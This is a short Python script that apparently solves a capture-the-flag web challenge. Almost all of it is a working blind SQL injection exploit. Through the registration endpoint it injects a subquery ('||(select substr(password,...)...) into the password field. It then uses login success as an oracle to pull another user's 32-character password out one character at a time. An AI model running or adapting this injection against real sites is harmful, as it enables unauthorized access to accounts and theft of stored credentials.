#!/usr/bin/env python3

import requests
import random
import time

url = "https://cool.mc.ax/"
alpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"

password = []
slot = 1
reqs = 0

def login(username):
    payload = {
        "username": username,
        "password": '1'
    }
    r = requests.post(url, data=payload)

    if "Incorrect username or password" not in r.text:
        return True
    else:
        return False

while True:
    for letter in alpha:
        reqs += 1
        if reqs % 20 == 0:
            time.sleep(.3)
        username = ''.join(random.choice(list(alpha)) for _ in range(30))
        payload = {
            "username": username,
            "password": f"'||(select substr(password,{slot},1)=\"{letter}\" from users)|'"
        }

        r = requests.post(f"{url}register", data=payload)
        if "You are logged in!" in r.text:
            if login(payload["username"]):
                if slot == 32:
                    password.append(letter)
                    print(f"Found Ginkoid's Password: {''.join(password)}")
                    exit()
                slot += 1
                print(f"Found Letter: " + letter)
                password.append(letter)
                break
